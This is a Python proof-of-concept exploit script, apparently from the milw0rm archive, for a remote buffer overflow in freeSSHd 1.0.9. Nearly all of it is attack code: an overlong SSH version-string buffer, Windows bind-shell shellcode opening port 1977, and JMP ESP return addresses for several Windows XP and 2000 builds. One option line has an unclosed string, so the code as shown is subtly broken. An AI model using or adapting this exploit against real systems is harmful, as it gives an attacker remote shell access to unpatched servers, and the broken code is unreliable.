#!/usr/bin/env python

"""
Coded by Tauqeer Ahmad a.k.a 0x-Scientist-x0
ahmadtauqeer[at]yahoo.com
Disclaimer: This Proof of concept exploit is for educational purpose only.
           Please do not use it against any system without prior permission.
           You are responsible for yourself for what you do with this code.

Greetings: All the Pakistani White Hats including me ;)
Flames:    To all the skript kiddies out there. Man grow up!.
Code tasted against freeSSHd version 1.0.9
If you didn't get shell at first try, try few times and you will get lucky

Advisories:
http://www.securityfocus.com/bid/17958
http://www.frsirt.com/english/advisories/2006/1786

"""
import socket
import getopt
import sys

host = "192.168.0.2"
port = 0
eip =""

#/* win32_bind -  EXITFUNC=thread LPORT=1977 Size=317 Encoder=None http://metasploit.com */
shellcode =    "\xfc\x6a\xeb\x4d\xe8\xf9\xff\xff\xff\x60\x8b\x6c\x24\x24\x8b\x45" \
               "\x3c\x8b\x7c\x05\x78\x01\xef\x8b\x4f\x18\x8b\x5f\x20\x01\xeb\x49" \
               "\x8b\x34\x8b\x01\xee\x31\xc0\x99\xac\x84\xc0\x74\x07\xc1\xca\x0d" \
               "\x01\xc2\xeb\xf4\x3b\x54\x24\x28\x75\xe5\x8b\x5f\x24\x01\xeb\x66" \
               "\x8b\x0c\x4b\x8b\x5f\x1c\x01\xeb\x03\x2c\x8b\x89\x6c\x24\x1c\x61" \
               "\xc3\x31\xdb\x64\x8b\x43\x30\x8b\x40\x0c\x8b\x70\x1c\xad\x8b\x40" \
               "\x08\x5e\x68\x8e\x4e\x0e\xec\x50\xff\xd6\x66\x53\x66\x68\x33\x32" \
               "\x68\x77\x73\x32\x5f\x54\xff\xd0\x68\xcb\xed\xfc\x3b\x50\xff\xd6" \
               "\x5f\x89\xe5\x66\x81\xed\x08\x02\x55\x6a\x02\xff\xd0\x68\xd9\x09" \
               "\xf5\xad\x57\xff\xd6\x53\x53\x53\x53\x53\x43\x53\x43\x53\xff\xd0" \
               "\x66\x68\x07\xb9\x66\x53\x89\xe1\x95\x68\xa4\x1a\x70\xc7\x57\xff" \
               "\xd6\x6a\x10\x51\x55\xff\xd0\x68\xa4\xad\x2e\xe9\x57\xff\xd6\x53" \
               "\x55\xff\xd0\x68\xe5\x49\x86\x49\x57\xff\xd6\x50\x54\x54\x55\xff" \
               "\xd0\x93\x68\xe7\x79\xc6\x79\x57\xff\xd6\x55\xff\xd0\x66\x6a\x64" \
               "\x66\x68\x63\x6d\x89\xe5\x6a\x50\x59\x29\xcc\x89\xe7\x6a\x44\x89" \
               "\xe2\x31\xc0\xf3\xaa\xfe\x42\x2d\xfe\x42\x2c\x93\x8d\x7a\x38\xab" \
               "\xab\xab\x68\x72\xfe\xb3\x16\xff\x75\x44\xff\xd6\x5b\x57\x52\x51" \
               "\x51\x51\x6a\x01\x51\x51\x55\x51\xff\xd0\x68\xad\xd9\x05\xce\x53" \
               "\xff\xd6\x6a\xff\xff\x37\xff\xd0\x8b\x57\xfc\x83\xc4\x64\xff\xd6" \
               "\x52\xff\xd0\x68\xef\xce\xe0\x60\x53\xff\xd6\xff\xd0"


def exploit():

   buff = "\x53\x53\x48\x2d\x31\x2e\x39\x39\x2d\x4f\x70\x65\x6e\x53\x53\x48" \
          "\x5f\x33\x2e\x34\x0a\x00\x00\x4f\x04\x05\x14\x00\x00\x00\x00\x00" \
          "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x07\xde"

   buff = buff + "A" * 1055
   buff = buff + eip
   buff = buff + "yyyy"
   buff = buff + "\x90" * 4
   buff = buff + shellcode
   buff = buff + "B" * 19021 + "\r\n"

   sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
   sock.connect((host, port))
   print "+ Recive reply from server: " + sock.recv(1000)

   sock.send(buff)
   print "+ SSHD exploited. Now telnet to port 1977 to get shell "
   print "+ if you didnt get shell in first try.Try again until you success"

   sock.close()
   sock = None


def usage():
   print "#############################################"
   print "#           CODED BY TAUQEER AHMAD          #"
   print "#                 Scientist                 #"
   print "#############################################"
   print "\n"
   print "Usage: %s -h <hostip> -p <port> -o <OS>" % sys.argv[0]
   print "Following OS supported\n"
   print "1 Window XP SP1"
   print "2 Window XP SP2"
   print "3 Windows 2000 Advanced Server"


if __name__ == '__main__':

   if len(sys.argv) < 7:
       usage()
       sys.exit()

   try:
       options = getopt.getopt(sys.argv[1:], 'h:p:o:')[0]
   except getopt.GetoptError, err:
       print err
       usage()
       sys.exit()


   for option, value in options:
       if option == '-h':
           host = value
       if option == '-p':
           port = int(value)
       if option == '-o':
           if value == '1':
               eip = "\xFC\x18\xD7\x77"  # 77D718FC JMP ESP IN USER32.dll (Windows Xp professional SP1)
           elif value == '2':
               eip = "\x0A\xAF\xD8\x77"  # 77D8AF0A JMP ESP IN USER32.DLL (Windows Xp professional SP2)
           elif value == '3':
               eip = "\x4D\x3F\xE3\x77"  # 77E33F4D JMP ESP IN USER32.DLL (windows 2000 advanced server)
           elif value == '4:
	       eip = "\x29\x4c\xE1\x77"  # 77E14c29 JMP ESP IN USER32.DLL (windows 2000 Prof. SP4)
           else:
               usage()
               sys.exit()

   exploit()

# milw0rm.com [2006-05-15]